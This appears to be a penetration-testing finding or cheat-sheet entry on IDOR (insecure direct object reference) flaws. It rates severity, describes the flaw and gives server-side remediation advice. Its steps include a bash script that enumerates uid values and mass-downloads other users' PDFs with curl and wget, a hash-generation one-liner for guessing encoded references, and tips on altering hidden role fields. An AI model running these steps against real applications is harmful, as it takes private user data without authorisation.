# Broken Access Control - Insecure Direct Object References (IDOR)

**Title:** IDOR - Accessing Other Users' Data via Object References

**Severity:** High

**Impact:** High

**Exploitability:** High

**CVSS Base Score:** 7.5

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N

**Vulnerability Type:** Broken Access Control

**Target:** Parameters referencing objects (user_id, filename, document ID)

## Impact

Unauthorized access to other users' data, privilege escalation, data modification or deletion.

## Description

The application uses client-supplied identifiers to access resources without verifying ownership or permissions.

## Steps to Reproduce

**Finding references:**
- URL parameters and APIs: `?uid=1`, `?filename=file_1.pdf`
- AJAX calls for privileged functions.
- Hashed or encoded references (e.g., MD5 of filename or base64 + hash).
- Predictable naming: `/documents/Invoice_1_09_2021.pdf`

**Mass enumeration example** (adapt to target):
```bash
#!/bin/bash
url="$1"

for i in {1..10}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q $url/$link
    done
done
```

**Hashed IDOR example:**
```bash
echo -n 1 | base64 -w 0 | md5sum | tr -d ' -'
# Then use the hash in requests
```

**Insecure APIs example:**
Look for hidden fields like uid, uuid, role in JSON or form data. Changing them can allow access to other users' data or admin functions.

## Recommendation

Implement access control checks on every request server-side. Use indirect references or GUIDs. Enforce authorization at object level.

## References

- OWASP Broken Access Control
